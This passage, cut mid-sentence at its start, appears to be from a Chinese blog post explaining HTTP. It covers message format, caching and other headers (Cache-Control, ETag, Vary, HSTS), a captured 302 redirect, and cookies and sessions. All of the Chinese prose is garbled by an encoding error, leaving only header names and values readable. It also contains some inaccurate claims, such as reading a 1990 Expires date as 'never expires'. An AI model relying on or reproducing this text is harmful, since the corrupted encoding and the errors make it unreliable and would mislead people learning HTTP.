â€œsports.qq.comâ€ å…¬ç”¨ä¸€ä¸ªå…³è”çš„åŸŸåâ€qq.comâ€ï¼Œæˆ‘ä»¬å¦‚æœæƒ³è®© â€œsports.qq.comâ€ ä¸‹çš„cookieè¢« â€œwww.qq.com&quot; è®¿é—®ï¼Œæˆ‘ä»¬å°±éœ€è¦ç”¨åˆ° cookie çš„domainå±æ€§ï¼Œå¹¶ä¸”éœ€è¦æŠŠpathå±æ€§è®¾ç½®ä¸º â€œ/â€œã€‚cookieè¿˜æœ‰domainå’Œpathçš„æ¦‚å¿µ &lt;method&gt; &lt;request-URL&gt; &lt;version&gt; &lt;headers&gt; &lt;entity-body&gt; å“åº”çš„æ ¼å¼ &lt;version&gt; &lt;status&gt; &lt;reason-phrase&gt; &lt;headers&gt; &lt;entity-body&gt; requestä¸­å¸¸è§çš„è¯·æ±‚å¤´åŒ…æ‹¬ï¼š Acceptï¼šæŒ‡å®šå®¢æˆ·ç«¯èƒ½å¤Ÿæ¥æ”¶çš„å†…å®¹ç±»å‹ Accept-Charset ï¼šæµè§ˆå™¨å¯ä»¥æ¥å—çš„å­—ç¬¦ç¼–ç é›† Accept-Encoding:gzip, deflate, brå®¢æˆ·ç«¯æµè§ˆå™¨å¯ä»¥æ”¯æŒçš„å‹ç¼©ç¼–ç ç±»å‹ã€‚æ¯”å¦‚gzipï¼Œç”¨äºå‹ç¼©æ•°æ®ï¼ŒèŠ‚çœå¸¦å®½ã€‚ Accept-Language æŒ‡å®šHttpå®¢æˆ·ç«¯æµè§ˆå™¨ç”¨æ¥ä¼˜å…ˆå±•ç¤ºçš„è¯­è¨€ç¤ºä¾‹: Accept-Language:zh-CN,zh;q=0.8,en-US;q=0.6,en;q=0.4 Cache-Controlï¼š å‚è€ƒå…·ä½“æ“ä½œç™¾åº¦ç™¾ç§‘å†™çš„å¾ˆæ¸…æ¥šå¯èƒ½çš„å€¼åŒ…æ‹¬ï¼š public æ‰€æœ‰å†…å®¹éƒ½å°†è¢«ç¼“å­˜(å®¢æˆ·ç«¯å’Œä»£ç†æœåŠ¡å™¨éƒ½å¯ç¼“å­˜)private å†…å®¹åªç¼“å­˜åˆ°ç§æœ‰ç¼“å­˜ä¸­(ä»…å®¢æˆ·ç«¯å¯ä»¥ç¼“å­˜ï¼Œä»£ç†æœåŠ¡å™¨ä¸å¯ç¼“å­˜)no-cache å¿…é¡»å…ˆä¸æœåŠ¡å™¨ç¡®è®¤è¿”å›çš„å“åº”æ˜¯å¦è¢«æ›´æ”¹ï¼Œç„¶åæ‰èƒ½ä½¿ç”¨è¯¥å“åº”æ¥æ»¡è¶³åç»­å¯¹åŒä¸€ä¸ªç½‘å€çš„è¯·æ±‚ã€‚å› æ­¤ï¼Œå¦‚æœå­˜åœ¨åˆé€‚çš„éªŒè¯ä»¤ç‰Œ (ETag)ï¼Œno-cache ä¼šå‘èµ·å¾€è¿”é€šä¿¡æ¥éªŒè¯ç¼“å­˜çš„å“åº”ï¼Œå¦‚æœèµ„æºæœªè¢«æ›´æ”¹ï¼Œå¯ä»¥é¿å…ä¸‹è½½ã€‚no-store æ‰€æœ‰å†…å®¹éƒ½ä¸ä¼šè¢«ç¼“å­˜åˆ°ç¼“å­˜æˆ– Internet ä¸´æ—¶æ–‡ä»¶ä¸­(å’Œno-cacheç›¸æ¯”ï¼Œâ€œno-storeâ€åˆ™è¦ç®€å•å¾—å¤šã€‚å®ƒç›´æ¥ç¦æ­¢æµè§ˆå™¨ä»¥åŠæ‰€æœ‰ä¸­é—´ç¼“å­˜å­˜å‚¨ä»»ä½•ç‰ˆæœ¬çš„è¿”å›å“åº”ï¼Œä¾‹å¦‚ï¼ŒåŒ…å«ä¸ªäººéšç§æ•°æ®æˆ–é“¶è¡Œä¸šåŠ¡æ•°æ®çš„å“åº”ã€‚æ¯æ¬¡ç”¨æˆ·è¯·æ±‚è¯¥èµ„äº§æ—¶ï¼Œéƒ½ä¼šå‘æœåŠ¡å™¨å‘é€è¯·æ±‚ï¼Œå¹¶ä¸‹è½½å®Œæ•´çš„å“åº”ã€‚å‘ç°è™½ç„¶è®¾ç½®äº†no-cacheï¼Œä½†æ˜¯æ²¡æœ‰è®¾ç½®ETagå¯ä»¥è¿›è¡Œæ ¡éªŒï¼Œæœ€ç»ˆè¿˜æ˜¯ä»ç¼“å­˜é‡Œè¯»å–)ã€‚æœ‰äº›æ•æ„Ÿä¿¡æ¯ï¼Œç”¨æˆ·è´¦æˆ·åˆ—è¡¨è¿™ç§ï¼Œå°±åº”è¯¥å®Œå…¨ä¸ç¼“å­˜åœ¨æœ¬åœ°ã€‚max-age=xxx (xxx is numeric) ç¼“å­˜çš„å†…å®¹å°†åœ¨ xxx ç§’åå¤±æ•ˆ, è¿™ä¸ªé€‰é¡¹åªåœ¨HTTP 1.1å¯ç”¨, å¹¶å¦‚æœå’ŒLast-Modifiedä¸€èµ·ä½¿ç”¨æ—¶, ä¼˜å…ˆçº§è¾ƒé«˜ å®é™…è¿‡ç¨‹ä¸­æˆ‘çœ‹åˆ°äº†è¿™ç§ï¼šCache-Control:private, no-cache, no-cache=Set-Cookie, no-store, proxy-revalidateï¼Œmust-revalidateâ€¦. è€Œæµè§ˆå™¨çš„å‰è¿›åé€€ï¼Œé»˜è®¤ä¼šä»ç¼“å­˜é‡Œè¯»å–ï¼Œå®Œå…¨ä¸å‘è¯·æ±‚ã€‚ ç¼“å­˜çš„ä¼˜å…ˆçº§æ˜¯ï¼š å…ˆçœ‹ç¼“å­˜æ˜¯å¦è¿‡æœŸ å‘é€Etag(å¦‚æœæœ‰çš„è¯ï¼ŒæœåŠ¡å™¨å†³ç­–æ—¶304è¿˜æ˜¯200)ï¼Œå‘é€If-None-Match å¦‚æœæœ‰Last-Modifiedçš„è¯ï¼Œå‘é€If-Modified-Sinceã€‚ ä¸Šè¿°éƒ½å¤±æ•ˆçš„è¯ï¼Œå°±å½“æ˜¯å…¨æ–°çš„è¯·æ±‚ Connection:keep-alive http1.1 é»˜è®¤ä¸ºkeep-alivehttp 1.0éœ€è¦æ‰‹åŠ¨è®¾ç½®ã€‚åŸç†å°±æ˜¯æœåŠ¡å™¨ä¿æŒå®¢æˆ·ç«¯åˆ°æœåŠ¡å™¨çš„è¿æ¥æŒç»­æœ‰æ•ˆï¼Œé¿å…äº†é‡æ–°å»ºç«‹è¿æ¥çš„å¼€é”€(tcpä¸‰æ¬¡æ¡æ‰‹)ã€‚è¿™ç§æƒ…å†µä¸‹ï¼Œå®¢æˆ·ç«¯ä¸èƒ½æ ¹æ®è¯»å–åˆ°EOF(-1)æ¥åˆ¤æ–­ä¼ è¾“å®Œæ¯•ã€‚æœ‰ä¸¤ç§è§£å†³æ–¹æ¡ˆï¼šå¯¹äºé™æ€æ–‡ä»¶ï¼Œå®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨èƒ½å¤ŸçŸ¥é“å…¶å¤§å°ï¼Œä½¿ç”¨content-lengthï¼Œæ ¹æ®è¿™ä¸ªåˆ¤æ–­æ•°æ®æ˜¯å¦å·²ç»æ¥æ”¶å®Œæˆï¼›å¯¹äºåŠ¨æ€é¡µé¢ï¼Œä¸å¯èƒ½é¢„å…ˆçŸ¥é“å†…å®¹å¤§å°ã€‚å¯ä»¥ä½¿ç”¨Transfer-Encoding:chunkedçš„æ¨¡å¼è¿›è¡Œä¼ è¾“ã€‚åŸºæœ¬ä¸Šå°±æ˜¯æœåŠ¡å™¨æŠŠæ–‡ä»¶åˆ†æˆå‡ å—ï¼Œä¸€å—ä¸€å—çš„å‘é€è¿‡å»ã€‚å‚è€ƒ Content-Type ä»£è¡¨æ–‡ä»¶ç±»å‹ã€‚requeståªæœ‰POSTè¯·æ±‚ä¸­ä¼šæœ‰ï¼ŒResponseä¸­ä¹Ÿä¼šæœ‰ã€‚POSTé‡Œé¢çš„Content-typeæœ‰ä¸¤ç§:ä¸€ï¼š Content-type: application/x-www-form-urlencoded;charset:UTF-8 //ç¼ºçœå€¼ï¼Œè¡¨ç¤ºæäº¤è¡¨å•ã€‚åªèƒ½ä¼ é”®å€¼å¯¹ã€‚æ¯”å¦‚ tel=13637829200&amp;password=123456 äºŒï¼š multipart/form-data //ä¸Šä¼ æ–‡ä»¶æ—¶ç”¨è¿™ç§ï¼Œæ—¢å¯ä»¥å‘é€æ–‡æœ¬æ•°æ®ï¼Œä¹Ÿæ”¯æŒäºŒè¿›åˆ¶ä¸Šä¼ ã€‚ä¸Šé¢é‚£ä¸ªCharSetåªæ˜¯ä¸ºäº†å‘Šè¯‰æœåŠ¡å™¨ç”¨çš„æ˜¯å“ªç§ç¼–ç ï¼Œèƒ½ä¼ äºŒè¿›åˆ¶ã€‚æ¯”æ–¹è¯´ ------WebKitFormBoundaryw0ZREBdOiJbbwuAg Content-Disposition: form-data; name=&quot;uploads[]&quot;; filename=&quot;278a516893f31a16feee.jpg&quot; Content-Type: image/jpeg ------WebKitFormBoundaryw0ZREBdOiJbbwuAg-- å“åº”å¤´ä¸­çš„Content-Typeç¤ºä¾‹ï¼š Content-Type:image/gifæˆ–è€…Content-Type: text/html;charset=utf-8 å‚è€ƒ Date:Sun, 23 Jul 2017 07:39:47 GMT è¿™å°±æ˜¯å½“å‰çš„GMTæ—¶é—´ DNT: 1 Do Not Trackï¼ˆå½“ç”¨æˆ·æå‡ºå¯ç”¨â€œè¯·å‹¿è¿½è¸ªâ€åŠŸèƒ½åï¼Œå…·æœ‰â€œè¯·å‹¿è¿½è¸ªâ€åŠŸèƒ½çš„æµè§ˆå™¨ä¼šåœ¨httpæ•°æ®ä¼ è¾“ä¸­æ·»åŠ ä¸€ä¸ªâ€œå¤´ä¿¡æ¯â€ï¼ˆheadersï¼‰ï¼Œè¿™ä¸ªå¤´ä¿¡æ¯å‘å•†ä¸šç½‘ç«™çš„æœåŠ¡å™¨è¡¨æ˜ç”¨æˆ·ä¸å¸Œæœ›è¢«è¿½è¸ªã€‚è¿™æ ·ï¼Œéµå®ˆè¯¥è§„åˆ™çš„ç½‘ç«™å°±ä¸ä¼šè¿½è¸ªç”¨æˆ·çš„ä¸ªäººä¿¡æ¯æ¥ç”¨äºæ›´ç²¾å‡†çš„åœ¨çº¿å¹¿å‘Šã€‚ï¼‰ Etag ç”¨äºæ¯”è¾ƒå®¢æˆ·ç«¯è¯·æ±‚çš„æ–‡ä»¶çš„å†…å®¹æ˜¯å¦å‘ç”Ÿäº†æ”¹å˜ã€‚è·ŸLast-Modifiedçš„ä½œç”¨å·®ä¸å¤šã€‚æœ€ç®€å•çš„ç”¨hashå€¼å°±å¯ä»¥äº†ã€‚ Expires:Mon, 01 Jan 1990 00:00:00 GMT è¿‡æœŸæ—¶é—´ï¼Œè¿™é‡Œåº”è¯¥æ˜¯æ°¸ä¸è¿‡æœŸ HOST æœåŠ¡å™¨çš„åŸŸå(domain)æˆ–è€…ipåœ°å€Host: www.baidu.com If-Modified-Since:Fri, 24 Feb 2017 12:37:22 GMT è¿™ä¸ªè·Ÿç¼“å­˜æœ‰å…³ If-None-Match:â€abf29cbe9a8ed21:0â€ è¿˜æ˜¯ç¼“å­˜ Pramga å’ŒCache-Controlä¸€æ ·å®ä¾‹ï¼š Pramga: no-cache ç›¸å½“äº Cache-Controlï¼š no-cacheã€‚ User-Agent è¿™ä¸ªä»£è¡¨ç”¨çš„æ˜¯å“ªç§æµè§ˆå™¨(å®¢æˆ·ç«¯)ï¼Œå†™çˆ¬è™«çš„æ—¶å€™æ‰¾åˆ°ä¸€å¤§å †User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36Androidè®¾å¤‡å‘å‡ºæ¥çš„å¯èƒ½é•¿è¿™æ ·ï¼š Mozilla/5.0 (Linux; U; Android 4.4.4; zh-cn; HTC_D820u Build/KTU84P) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30iosè®¾å¤‡å‘å‡ºæ¥çš„é•¿è¿™æ ·: Mozilla/5.0 (iPhone; CPU iPhone OS 8_0 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12A365 Safari/600.1.4è‡³å°‘Chromeå›¢é˜Ÿç»™å‡ºäº†è‡ªå®¶æµè§ˆå™¨çš„UA Referer ä¸€èˆ¬æ˜¯ä¸€ä¸ªurlï¼Œä»£è¡¨å½“å‰è¯·æ±‚æ—¶ä»å“ªä¸ªé¡µé¢å‘å‡ºçš„ï¼Œå†™çˆ¬è™«æœ‰ç”¨ Headerå…¶å®å°±æ˜¯ä¸ªå­—å…¸ï¼Œæ¯”è¾ƒéº»çƒ¦çš„å°±æ˜¯Cache-Controläº†ï¼Œè¿™ä¸ªè¿˜è¦ç»“åˆIf-None-Matchï¼ŒEtagæ¥çœ‹ã€‚éœ€è¦ç”¨çš„æ—¶å€™å†çœ‹åº”è¯¥ä¹Ÿä¸è¿Ÿã€‚ Varyæ¯”è¾ƒæœ‰æ„æ€ï¼šserverç«¯æ¯æ¬¡æ¥æ”¶åˆ°ä¸€ä¸ªè¯·æ±‚ï¼Œä¼šæ ¹æ®requestçš„ä¸€äº›ç‰¹å®šå±æ€§æ¥ç¡®è®¤ä¹‹å‰æœ‰æ²¡æœ‰åˆ«çš„å®¢æˆ·è¯·æ±‚è¿‡åŒæ ·çš„èµ„æºï¼Œè¦æ˜¯æœ‰çš„è¯ï¼Œç›´æ¥è¿”å›å°±å¥½äº†ã€‚è€Œè¿™ä¸ªåˆ¤å®šæ˜¯å¦è¯·æ±‚çš„åŒä¸€ä¸ªèµ„æºçš„æ ‡å‡†å°±æ˜¯Vary(ä¸Šä¸€æ¬¡Responseä¸­ä¼šè¿”å›{Vary:Accept-Encoding,Vary:â€SomeCustomHeaerKeyâ€})ï¼Œvaryå¯ä»¥å†™å¤šä¸ªã€‚ä»ç™¾åº¦çš„Responseæ¥çœ‹ï¼Œä¸€èˆ¬è¿™ä¸ªå€¼è®¾å®šä¸ºAccept-Encodingå°±å¥½äº†ã€‚ç»å¸¸ä½¿ç”¨Vary: Accept-Encodingçš„ä¸€ä¸ªåŸå› æ˜¯ï¼Œæœ‰äº›å®¢æˆ·ç«¯ä¸æ”¯æŒgzipã€‚Accept-Encodingä¸€èˆ¬é•¿è¿™æ ·ï¼š Accept-Encoding:gzip,deflate,sdchæ‰€ä»¥ç¼“å­˜æœåŠ¡å™¨è¦æ˜¯æŠŠgzipçš„èµ„æºå‘ç»™äº†ä¸æ”¯æŒgzipçš„å®¢æˆ·ç«¯ï¼Œé‚£å°±æ˜¯é”™è¯¯äº†ã€‚å¢åŠ  Vary: Accept-Encoding å“åº”å¤´ï¼Œä¸Šæ¸¸æœåŠ¡æ˜ç¡®å‘ŠçŸ¥ç¼“å­˜æœåŠ¡å™¨æŒ‰ç…§ Accept-Encoding å­—æ®µçš„å†…å®¹ï¼Œåˆ†åˆ«ç¼“å­˜ä¸åŒçš„ç‰ˆæœ¬ï¼›nginxé‡Œé¢åŠ ä¸Šè¿™ä¸€æ¡å°±å¥½äº†ï¼šgzip_vary on;mozillaå¯¹äºVaryè¿™ä¸ªheaderçš„æè¿°æ˜¯è¿™æ ·çš„ï¼Œè¿™ä¸ªå±äºcontent-negotiationçš„ä¸€éƒ¨åˆ†.æ‰€ä»¥è¿™ä¸ªHeaderæ˜¯åç«¯æœåŠ¡å™¨å†™ç»™ç¼“å­˜æœåŠ¡å™¨çœ‹çš„ï¼Œé¡ºå¸¦æš´éœ²åœ¨å®¢æˆ·ç«¯é‡Œé¢äº†.å…³äºcontent-negotationï¼Œæ— éä¸¤ç§ï¼ŒæœåŠ¡ç«¯åˆ—å‡ºå¤šé¡¹é€‰æ‹©ï¼ˆè¿™ä»½èµ„æºå¯ç”¨ç‰ˆæœ¬çš„åˆ—è¡¨ï¼‰ï¼Œè¿”å›Http300(multiple choices)è¿™ä¸ªheaderï¼Œè®©å‰ç«¯è‡ªå·±å»é€‰ã€‚å¦ä¸€ç§å°±æ˜¯åå°æ ¹æ®å‰æ®µå‘æ¥çš„requestä¸­çš„ä¸€äº›ä¿¡æ¯åšå‡ºé€‰æ‹©ï¼ˆserver-driven negotiationï¼Œä¸»è¦çœ‹Acceptï¼ŒAccept-Charset,Accept-Encoding,Accept-Languageè¿™äº›ä¸œè¥¿ï¼‰ã€‚æ‰€ä»¥å¸¸å¸¸ä¼šçœ‹åˆ°è¯·æ±‚ä¸­Accept-Language: zh-CN,zh;q=0.9 è¿™ä¸ªqè¡¨ç¤ºæœ‰å¤šå°‘çš„æƒé™ï¼Œæ‰€ä»¥è¿™ä¸ªæ¯”é‡åº”è¯¥æ˜¯å‚ä¸äº†content-negotiationçš„è®¡ç®—ã€‚ Vary:Originå’ŒCORSçš„å…³ç³»CORSè¯·æ±‚ä¼šå¸¦ä¸ŠOriginè¯·æ±‚å¤´ï¼Œç”¨æ¥å‘åˆ«äººçš„ç½‘ç«™è¡¨æ˜è‡ªå·±æ˜¯è°ã€‚Vary: Originå¯ä»¥è®©åŒä¸€ä¸ªURLè¯·æ±‚æ ¹æ®ORIGINè¿™ä¸ªè¯·æ±‚å¤´è¿”å›ä¸åŒçš„ç¼“å­˜ç‰ˆæœ¬ã€‚å®è·µä¸­ï¼Œå¦‚æœAccess-Control-Allow-Originçš„å“åº”å¤´ä¸æ˜¯å†™æˆäº†*å·çš„è¯ï¼Œå°±åº”è¯¥åŠ ä¸ŠVary: Originï¼Œä»¥æ­¤é¿å…ä¸åŒçš„Originè·å¾—çš„ç¼“å­˜ç‰ˆæœ¬é”™ä¹±ã€‚ strict-transport-securitystrict-transport-security: max-age=31536000 max-age=&lt;expire-time&gt; è®¾ç½®åœ¨æµè§ˆå™¨æ”¶åˆ°è¿™ä¸ªè¯·æ±‚åçš„&lt;expire-time&gt;ç§’çš„æ—¶é—´å†…å‡¡æ˜¯è®¿é—®è¿™ä¸ªåŸŸåä¸‹çš„è¯·æ±‚éƒ½ä½¿ç”¨HTTPSè¯·æ±‚ã€‚ WikIä¸Šæ¯”è¾ƒå®Œæ•´ Transfer-Encoding: chunked æœ‰æ—¶å€™è¦ä¼ è¾“çš„Content-Lengthå®åœ¨å¤ªå¤§ï¼ŒæœåŠ¡å™¨è®¡ç®—é•¿åº¦éœ€è¦å¼€å¾ˆå¤§çš„Bufferï¼Œå¹²è„†æŠŠæ–‡ä»¶åˆ†å—ä¼ è¾“ã€‚wikiçš„è§£é‡Šï¼Œæ³¨æ„æ­¤æ—¶content-lengthæ— æ•ˆã€‚æµè§ˆå™¨å¯¹äºç¼“å­˜çš„å®é™…å¤„ç†ï¼Œæ˜¯å¦è¿‡æœŸç”±Cache-Controlæ ‡è¯†çš„max-ageå’ŒExpiresåˆ¤æ–­ã€‚Cache-Controlçš„ä¼˜å…ˆçº§è¾ƒé«˜ã€‚From Chromeç®€å•æ¥è¯´å°±æ˜¯å…ˆçœ‹å®¢æˆ·ç«¯æ˜¯å¦Expireï¼Œç„¶åå»æœåŠ¡å™¨çœ‹ä¸‹Etag,æœ€åçœ‹Last-Modifiedé‚£ä¸ªã€‚ ä¸€ä¸ªresponseé‡Œé¢å‡ºç°å¤šä¸ªç›¸åŒçš„keyçš„headeræ˜¯ç¬¦åˆæ ‡å‡†çš„ å®é™…çš„ä¾‹å­ X-Akamai-Session-Info: name=ADVPF_PREFETCHABLE_TRACE; value=docs.oracle.com: TDCOUPLED ANY X-Akamai-Session-Info: name=ENABLE_SD_POC; value=yes X-Akamai-Session-Info: name=NL_22357_ORACLEDEVELOPERIPBLOCKL_NAME; value=Oracle Developer IP Block List X-Akamai-Session-Info: name=AKA_PM_NETSTORAGE_ROOT; value=/319188 X-Akamai-Session-Info: name=AKA_PM_SR_NODE_ID; value=0 X-Akamai-Session-Info: name=FASTTCP_RENO_FALLBACK_DISABLE_OPTOUT; value=on X-Akamai-Session-Info: name=ADVPF_PREFETCHABLE_CATEGORY; value=TDCOUPLED_ANY X-Akamai-Session-Info: name=PMUSER_COUNTRY_CODE; value=CN; full_location_id=country_code X-Akamai-Session-Info: name=NL_23268_ORACLESHOPIPBLOCKLIST_NAME; value=Oracle Shop IP Block List å®é™…çš„æ•ˆåº”ç­‰åŒäºå°†æ‰€æœ‰çš„values filedç”¨é€—å·åˆ†éš”ä¹‹åä¸²åœ¨ä¸€èµ·ä¸¢åœ¨ä¸€ä¸ªheaderåé¢ã€‚ from wiki page: Akamaiæ˜¯ä¸€å®¶æ€»éƒ¨ä½äºç¾å›½é©¬è¨è¯¸å¡å·å‰‘æ¡¥å¸‚çš„å†…å®¹åˆ†å‘ç½‘ç»œå’Œäº‘æœåŠ¡æä¾›å•†ï¼Œæ˜¯ä¸–ç•Œä¸Šæœ€å¤§çš„åˆ†å¸ƒå¼è®¡ç®—å¹³å°ä¹‹ä¸€ï¼Œæ‰¿æ‹…äº†å…¨çƒ15-30%çš„ç½‘ç»œæµé‡ã€‚ è¡¥ä¸Šä¸€ä¸ªhttp statuscode = 302çš„å®é™…ä¾‹å­å§ï¼Œä»Šæ™šçœ‹è…¾è®¯æ–°é—»çš„æ—¶å€™æŠ“åˆ°çš„ Request URL:http://tdd.3g.qq.com/17421/e8475fe7-7418-43bf-9be7-c6b116730cac.gif?a=0.33637654883709955&amp;b=1511790303321 Request Method:GET Status Code:302 Found Remote Address:123.151.152.123:80 Referrer Policy:no-referrer-when-downgrade Request Header Accept:image/webp,image/apng,image/*,*/*;q=0.8 Accept-Encoding:gzip, deflate Accept-Language:zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7 Connection:keep-alive Cookie:XX=SDSDSADSA0; SADSAD=21FDGFDGF; //cookieæ˜¯æˆ‘ç¼–çš„ DNT:1 Host:tdd.3g.qq.com Referer:http://new.qq.com/omn/20171127A0OHHD00 User-Agent:Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.62 Safari/537.36 Response Header Cache-Control:max-age=0 Connection:close Content-Length:0 Date:Mon, 27 Nov 2017 13:45:04 GMT Expires:Mon, 27 Nov 2017 13:45:04 GMT Location:http://210.22.248.167/tdd.3g.qq.com/17421/e8475fe7-7418-43bf-9be7-c6b116730cac.gif?mkey=5a1c30156df5812a&amp;f=4f20&amp;c=0&amp;a=0.33637654883709955&amp;b=1511790303321&amp;p=.gif //æ³¨æ„è¿™ä¸ªæ–°çš„location Server:nws 1.2.15 4. Cookieå’ŒSession4.1 Cookieå…ˆçœ‹Wikiä¸Šçš„è§£é‡Š: æŒ‡æŸäº›ç½‘ç«™ä¸ºäº†è¾¨åˆ«ç”¨æˆ·èº«ä»½è€Œå‚¨å­˜åœ¨ç”¨æˆ·æœ¬åœ°ç»ˆç«¯ï¼ˆClient Sideï¼‰ä¸Šçš„æ•°æ®ï¼ˆé€šå¸¸ç»è¿‡åŠ å¯†.ä¸»è¦æ˜¯å› ä¸ºHttpæ˜¯æ— çŠ¶æ€çš„ï¼ŒæœåŠ¡å™¨ä¸çŸ¥é“è¿™ä¸€æ¬¡è¿æ¥å’Œä¸Šä¸€æ¬¡è¿æ¥æ˜¯ä¸æ˜¯åŒä¸€ä¸ªå®¢æˆ·ç«¯Cookieæ€»æ˜¯ä¿å­˜åœ¨å®¢æˆ·ç«¯ä¸­ï¼ŒæŒ‰åœ¨å®¢æˆ·ç«¯ä¸­çš„å­˜å‚¨ä½ç½®ï¼Œå¯åˆ†ä¸ºå†…å­˜Cookieå’Œç¡¬ç›˜Cookieã€‚å†…å­˜Cookieç”±æµè§ˆå™¨ç»´æŠ¤ï¼Œä¿å­˜åœ¨å†…å­˜ä¸­ï¼Œæµè§ˆå™¨å…³é—­åå°±æ¶ˆå¤±äº†ï¼Œå…¶å­˜åœ¨æ—¶é—´æ˜¯çŸ­æš‚çš„ã€‚ç¡¬ç›˜Cookieä¿å­˜åœ¨ç¡¬ç›˜é‡Œï¼Œæœ‰ä¸€ä¸ªè¿‡æœŸæ—¶é—´ï¼Œé™¤éç”¨æˆ·æ‰‹å·¥æ¸…ç†æˆ–åˆ°äº†è¿‡æœŸæ—¶é—´ï¼Œç¡¬ç›˜Cookieä¸ä¼šè¢«åˆ é™¤ï¼Œå…¶å­˜åœ¨æ—¶é—´æ˜¯é•¿æœŸçš„ã€‚æ‰€ä»¥ï¼ŒæŒ‰å­˜åœ¨æ—¶é—´ï¼Œå¯åˆ†ä¸ºéæŒä¹…Cookieå’ŒæŒä¹…Cookieã€‚ Cookieçš„ä¸€äº›ç¼ºç‚¹ï¼Œç›´æ¥ç…§æ¬WiKiäº† Cookieä¼šè¢«é™„åŠ åœ¨æ¯ä¸ªHTTPè¯·æ±‚ä¸­ï¼Œæ‰€ä»¥æ— å½¢ä¸­å¢åŠ äº†æµé‡ã€‚(å…¶å®è¿™é‡Œé¢åªåº”è¯¥æ”¾â€œæ¯æ¬¡è¯·æ±‚éƒ½è¦æºå¸¦çš„ä¿¡æ¯â€) ç”±äºåœ¨HTTPè¯·æ±‚ä¸­çš„Cookieæ˜¯æ˜æ–‡ä¼ é€’çš„ï¼Œæ‰€ä»¥å®‰å…¨æ€§æˆé—®é¢˜ã€‚ï¼ˆé™¤éç”¨HTTPSï¼‰ Cookieçš„å¤§å°é™åˆ¶åœ¨4KBå·¦å³ã€‚å¯¹äºå¤æ‚çš„å­˜å‚¨éœ€æ±‚æ¥è¯´æ˜¯ä¸å¤Ÿç”¨çš„ã€‚ ä¸€ä¸ªåŸŸåä¸‹å­˜æ”¾çš„cookieçš„ä¸ªæ•°æ˜¯æœ‰é™åˆ¶çš„ï¼Œä¸åŒçš„æµè§ˆå™¨å­˜æ”¾çš„ä¸ªæ•°ä¸ä¸€æ ·,ä¸€èˆ¬ä¸º20ä¸ªã€‚ cookieä¹Ÿå¯ä»¥è®¾ç½®è¿‡æœŸçš„æ—¶é—´ï¼Œé»˜è®¤æ˜¯ä¼šè¯ç»“æŸçš„æ—¶å€™ï¼Œå½“æ—¶é—´åˆ°æœŸè‡ªåŠ¨é”€æ¯ å¦å¤–ï¼Œä¸åŒåŸŸåæ˜¯æ— æ³•å…±äº«æµè§ˆå™¨ç«¯æœ¬åœ°ä¿¡æ¯ï¼ŒåŒ…æ‹¬cookiesï¼Œè¿™å³æ˜¯è·¨åŸŸé—®é¢˜ã€‚ç™¾åº¦æ˜¯ä¸èƒ½è¯»å–çˆ±å¥‡è‰ºçš„Cookieçš„ï¼Œè¿™æ˜¯å®‰å…¨æ€§é—®é¢˜ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œè™½ç„¶ç½‘ç«™images.google.comä¸ç½‘ç«™www.google.comåŒå±äºGoogleï¼Œä½†æ˜¯åŸŸåä¸ä¸€æ ·ï¼ŒäºŒè€…åŒæ ·ä¸èƒ½äº’ç›¸æ“ä½œå½¼æ­¤çš„Cookieã€‚å¿…é¡»åŸŸåä¸€æ ·æ‰èƒ½æ“ä½œã€‚Javaä¸­æŠŠCookieå°è£…æˆäº†javax.servlet.http.Cookieç±»ï¼Œç›´æ¥ç”¨å°±å¯ä»¥äº†ã€‚ Cookieå¹¶ä¸æä¾›ä¿®æ”¹ã€åˆ é™¤æ“ä½œã€‚å¦‚æœè¦ä¿®æ”¹æŸä¸ªCookieï¼Œåªéœ€è¦æ–°å»ºä¸€ä¸ªåŒåçš„Cookieï¼Œæ·»åŠ åˆ°responseä¸­è¦†ç›–åŸæ¥çš„Cookieã€‚ å¯¹äº†ï¼Œåœ¨ä¼—å¤šçš„Headerä¸­Cookieä¸€èˆ¬é•¿è¿™æ ·: Cookie:key1=value1;key_2=value2;key_3=value3;JSessionID=24DHFKDSFKJ324329NSANDI124EHæ•…æ„æŠŠæœ€åä¸€ä¸ªJSESSIONå†™å‡ºæ¥æ˜¯å› ä¸ºåº•ä¸‹è¦è®²Sessionäº†å˜› 4.2 Sessionå‚è€ƒæ–‡ç« Header(å­—å…¸)é‡Œé¢è£…ç€ä¸€ä¸ªCookie(å­—å…¸)ï¼ŒCookieé‡Œé¢æœ‰ä¸ªé”®å€¼å¯¹:JSESSIONID:SESSIONIDå®è§‚ä¸Šå°±æ˜¯è¿™ä¹ˆä¸ªå…³ç³»ã€‚ Cookieä¿å­˜åœ¨å®¢æˆ·ç«¯ï¼ŒSessionä¿å­˜åœ¨æœåŠ¡å™¨ç«¯ã€‚Sessionæ˜¯åœ¨å®¢æˆ·ç«¯ç¬¬ä¸€æ¬¡è®¿é—®çš„æ—¶å€™ç”±æœåŠ¡å™¨åˆ›å»ºçš„ï¼Œsessionä¸€èˆ¬å­˜å‚¨åœ¨redisä¸­ï¼ˆramï¼‰ï¼Œå®¢æˆ·ç«¯å§‹ç»ˆåªæœ‰sessionIdã€‚ç¬¬äºŒæ¬¡è¯·æ±‚çš„æ—¶å€™(sessionè¿˜æœªè¿‡æœŸ)ï¼Œæµè§ˆå™¨ä¼šåŠ ä¸ŠsessionId=XXXXXã€‚æœåŠ¡å™¨æ¥æ”¶åˆ°è¯·æ±‚åå°±å¾—åˆ°è¯¥è¯·æ±‚çš„sessionIDï¼ŒæœåŠ¡å™¨æ‰¾åˆ°è¯¥idçš„sessionè¿”è¿˜ç»™è¯·æ±‚è€…ï¼ˆServletï¼‰ä½¿ç”¨ã€‚ä¸€ä¸ªä¼šè¯åªèƒ½æœ‰ä¸€ä¸ªsessionå¯¹è±¡ï¼Œå¯¹sessionæ¥è¯´æ˜¯åªè®¤idä¸è®¤äººã€‚ 